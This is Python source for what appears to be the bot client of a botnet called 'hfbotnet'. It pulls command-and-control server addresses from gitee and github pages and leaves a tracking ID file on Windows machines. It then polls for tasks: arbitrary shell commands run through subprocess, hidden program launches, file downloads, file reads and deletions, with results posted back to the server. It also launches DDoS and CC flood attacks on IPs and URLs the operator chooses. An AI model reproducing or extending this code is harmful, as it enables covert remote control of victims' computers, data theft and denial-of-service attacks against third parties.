#! /usr/bin/en python3
# coding:utf8

import os, re, sys, uuid, shlex, chardet, subprocess
import json, time, platform, PIL, glob
from . import args as _args
from remoteimport import install_meta as remote
from requests import get, post
from threading import Thread

global Windows
import platform
Windows = True if platform.system() == 'Windows' else False

if Windows: from msg import msg

global cmds, DEBUG, is_shell, origins

DEBUG = False
is_shell = False
LOCAL = False
origins = [
    "https://mns-quc.gitee.io/hfbotnet/static/",
    "https://fu050409.github.io/hfbotnet/",
    ]

apps = [
        'cc',
        'cd',
        'cat',
        'she',
        'ddos',
        'wget',
        'msgbox',
        'python',
        ]

def debug(value):
    print("[SHELL] {}".format(value))

def error(value):
    if DEBUG and Windows:
        msg(title="DEBUG", msg="[DEBUG] {}".format(value)).start()

def GetRemotes(origin = "https://mns-quc.gitee.io/hfbotnet/"):
    global pkg, server, paths
    try:
        pkg = get("{origin}remote.html".format(origin = origin)).text.replace("\n", "")
        if "http" not in pkg:
            return False
        server = get("{origin}server.html".format(origin = origin)).text.replace("\n", "")
        if "http" not in server:
            return False
        debug("Loaded urls from origin {origin}".format(origin = origin))
        return True
    except ConnectionError:
        debug("错误：没有连接至互联网或Gitee损毁。")
        return False
    except Exception as e:
        debug(e)
        return False

if not LOCAL:
    if GetRemotes():
        pass
    else:
        for origin in origins:
            if GetRemotes(origin = origin):
                break
else:
    server = "http://127.0.0.1:201"

def MAC():
    mac=uuid.UUID(int = uuid.getnode()).hex[-12:]
    return ":".join([mac[e:e+2] for e in range(0,11,2)])

def GUID():
    global guid
    if "guid" in globals():
        return guid
    if not os.path.exists("C:\\Users\\Public\\HFSysNet.vsn"):
        guid = str(uuid.uuid1()).replace("-", "")
        gf = open("C:\\Users\\Public\\HFSysNet.vsn", "w")
        gf.write(guid)
        gf.close()
    else:
        guid = open("C:\\Users\\Public\\HFSysNet.vsn", "r").read().replace("\n", "")
    return guid

def cd(id, path):
    if '*' in path:
        paths = glob.glob(path)
        if len(paths) > 1:
            PushResult(id, '[CD] 参数过多.')
            return
        elif len(paths) == 0:
            PushResult(id, '[CD] 系统找不到指定的文件.')
            return
        else:
            try:
                os.chdir(paths[0])
            except Exception as e:
                PushResult(id, "[CD] 错误：{}".format(e))
                return
            PushResult(id, "[CD] 已切换工作目录")
            return

    try:
        os.chdir(path)
    except Exception as e:
        PushResult(id, "[CD] 错误：{}".format(e))
        return

    PushResult(id, "[CD] 已切换工作目录")

def wget(id, args):
    def parse(args):
        parser = _args.ArgumentParser(
            prog = "WGET",
            description="客户端文件下载工具."
            )
        parser.add_argument('url', metavar='URL', type=str,
                    help='下载的URL.')
        parser.add_argument("-o", "--output",
                            type = str,
                            help = "保存位置."
                            )
        parser.add_argument("-m", "--method",
                            type = str,
                            default = "wb",
                            help = "保存模式."
                            )
        args = parser.parse_args(args)
        return args

    if "-h" in args or "--help" in args:
        PushResult(id, "[WGET] 使用方法:\n      url 要下载的文件的URL.\n      -o  保存位置.\n      -m  保存模式.\n")
        return
    
    args = shlex.split(args)
    args = parse(args)

    if args.output == None:
        args.output = args.url.split("/")[-1]
    
    content = get(args.url).content
    try:
        save = open(args.output, args.method)
        save.write(content)
        save.close()
    except Exception as e:
        PushResult(id, str(e))
        return
    PushResult(id, "[WGET] 文件已保存至：{}".format(args.output))

def she(id, cmd):
    def parse(args):
        parser = _args.ArgumentParser(
            prog = "SHEXE",
            description="Win32API ShellExecute."
            )
        parser.add_argument('path', metavar='path', type=str,
                    help='要运行的程序的位置.')
        parser.add_argument("-d", "--display",
                            action = 'store_true',
                            default = False,
                            help = '是否显示窗口.'
                            )

        args = parser.parse_args(args)
        return args

    if "-h" in cmd or "--help" in cmd:
        PushResult(id, "[SHEXE] 使用方法:\n      path  要运行的程序的位置(及参数)\n      -d  是否显示窗口.\n")
        return
    
    args = shlex.split(cmd)
    args = parse(args)
    
    import win32api
    win32api.ShellExecute(0, 'open', args.path, '', '', 0)
    PushResult(id, "[SHEXE] 成功执行命令: {}".format(args.path))

def msgbox(id, args):
    def parse(args):
        parser = _args.ArgumentParser(
            prog = "MSGBOX",
            description="客户端弹窗工具."
            )
        parser.add_argument('-t', "--title",
                            type = str,
                            default = "Windows",
                            help = '标题.')
        parser.add_argument("-m", "--msg",
                            type = str,
                            help = "内容."
                            )
        args = parser.parse_args(args)
        return args

    if "-h" in args or "--help" in args:
        PushResult(id, "[MSGBOX] 使用方法:\n      -t 标题.\n      -m  内容.\n")
        return

    try:
        args = shlex.split(args)
    except ValueError:
        PushResult(id, """[MSGBOX] 包含有非法字符, 无法分割. 包含"'"、'"'等字符请在外包含引号.""")

    args = parse(args)

    msg(title=args.title, msg=args.msg).start()

    PushResult(id, "[MSGBOX] 弹窗: \n    标题:{title}, \n    内容:{msg}".format(
        title = args.title,
        msg = args.msg,
        ))

def cat(id, file):
    if '*' in file:
        files = glob.glob(file)
        if len(files) > 1:
            PushResult(id, '[CAT] 参数过多.')
            return
        elif len(files) == 0:
            PushResult(id, '[CAT] 文件不存在.')
            return
        else:
            file = files[0]

    try:
        file = shlex.split(file)[0]
    except Exception as e:
        PushResult(id, "{}".format(e))
        return

    try:
        content = open(file, "rb").read()
    except FileNotFoundError:
        PushResult(id, "[CAT] 文件不存在,请检查路径拼写是否正确. Windows系统中推荐使用'\\'作为文件夹分级")
        return

    try:
        encoding = chardet.detect(content)["encoding"]
        content = content.decode(encoding) if encoding != None else content.decode('utf8')
    except UnicodeDecodeError as e:
        PushResult(id, "[CAT] 编码失败: {}".format(e))
        return

    PushResult(id, content)

def ddos(id, args):
    def parse(args):
        parser = _args.ArgumentParser(
            prog = "HFDDOS",
            description="氢氟DDOS攻击池."
            )
        parser.add_argument('ipaddr',
                            metavar = 'IPAddress',
                            type = str,
                            help = '要进行DDOS攻击的IP地址.'
                            )
        parser.add_argument("-p", "--port",
                            type = int,
                            default = 80,
                            help = "端口."
                            )
        parser.add_argument("-c", "--thread",
                            type = int,
                            default = 39*3,
                            help = "要创建的线程数."
                            )
        parser.add_argument("-t", "--time",
                            type = int,
                            default = 39*3*3,
                            help = "要创建的线程数."
                            )
        args = parser.parse_args(args)
        return args

    from payloads import hfddos

    if "-h" in args or "--help" in args:
        PushResult(id, "[HFCC] 使用方法:\n      ipaddr 要进行DDOS攻击的IP地址.\n      -c  线程数.\n      -p  端口.\n      -t  攻击时长.\n")
        return
    
    args = shlex.split(args)
    args = parse(args)
    
    ip = args.ipaddr
    port = args.port
    thread = args.thread
    time = args.time
    
    hfddos.ddos(ip, port=int(port), thread=int(thread), time=int(time))
    PushResult(id, "[HFDDOS] 已加入DDOS线程")

def cc(id, args):
    def parse(args):
        parser = _args.ArgumentParser(
            prog = "HFCC",
            description="氢氟CC攻击池."
            )
        parser.add_argument('url', metavar='URL', type=str,
                    help='要进行CC攻击的URL.')
        parser.add_argument("-t", "--thread",
                            type = int,
                            default = 39*3,
                            help = "线程数."
                            )
        args = parser.parse_args(args)
        return args
    
    from payloads import hfcc

    if "-h" in args or "--help" in args:
        PushResult(id, "[HFCC] 使用方法:\n      url 要进行CC攻击的URL.\n      -t  线程数.\n")
        return

    args = shlex.split(args)
    args = parse(args)

    hfcc.cc(args.url, args.thread)
    PushResult(id, "[HFCC] 已加入CC线程")

def Deamon():
    global Exit, freed
    while True:
        if len(freed) >= 39:
            Exit = True
        time.sleep(3.9)

def run(id, cmd):
    try:
        p = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        result = p.stdout.read()
        retval = p.wait()
        debug(retval)
    except Exception as e:
        PushResult(id, "错误：{}".format(e))
    print(result)
    try:
         PushResult(id, result.decode('gbk','ignore'))
    except Exception as e:
         debug(e)

def delete(id, args):
    try:
        debug(args)
        if os.path.isdir(args):
            debug("Is dir.")
            subprocess.Popen("del /Q /S {}".format(args), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            PushResult(id, "清空文件夹：{}".format(args))
        else:
            debug("IS file.")
            p = subprocess.Popen("del {}".format(args), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            result = p.stdout.read()
            PushResult(id, result)
    except Exception as e:
        PushResult(id, e)

def PushResult(id, result):
    data = {
        "result": result,
        "guid": GUID(),
        "id": id,
        }
    while True:
        try:
            response = post("{}/shell/result/".format(server), data=data).text
            debug("Push Result's response is {}".format(response))
            if "200" in response:
                debug("Pushed result of task id:{} to server.".format(id))
                break
            else:
                raise
        except:
            continue
    
def Tasks():
    data = {
        "guid": GUID(),
        }
    return post("{}/shell/all/".format(server), data=data).text

def ShellMain():
    tasks = json.loads(Tasks())
    debug(tasks)
    global freed
    freed = []
    if tasks == []:
        freed.append("free")
    else:
        freed = []
    for task in tasks:
        debug("Task : {}".format(task["command"]))
        if task is None or task["command"] is "":
            PushResult(task["id"], "空白的命令")
            continue
        
        try:
            app = shlex.split(task["command"])[0]
        except ValueError as e:
            PushResult(task["id"], "{err}".format(err=e))
            continue
        except Exception as e:
            PushResult(task["id"], "{err}".format(err=e))
            continue

        if app in apps:
            args = task["command"]
            args = args.lstrip(args.split(" ")[0]).lstrip(" ")
            try:
                exec("""{app}(task["id"], args)""".format(
                    app = shlex.split(task["command"])[0],
                    )
                     )
            except Exception as e:
                PushResult(task["id"], "{err}".format(err=e))
            continue
        if shlex.split(task["command"])[0] == 'del' or shlex.split(task["command"])[0]=='rm':
            args = task["command"]
            args = args.lstrip(args.split(" ")[0]).lstrip(" ")
            delete(task["id"], args)
            continue
        if shlex.split(task["command"])[0] == 'exit':
            PushResult(task["id"], "已退出Shell线程")
            return True
        run(task["id"], task["command"])

def func():
    debug("Starting shell...")
    global is_shell, Exit
    is_shell = True
    while True:
        try:
            if ShellMain():
                break
            time.sleep(3.9/3/3)
        except Exception as e:
            debug("{}".format(e))
    is_shell = False
    debug("Var is_shell is '{}' at the end of shell main function.".format(is_shell))
    debug("Shell exit.")
    return

if __name__ == "__main__":
    func()

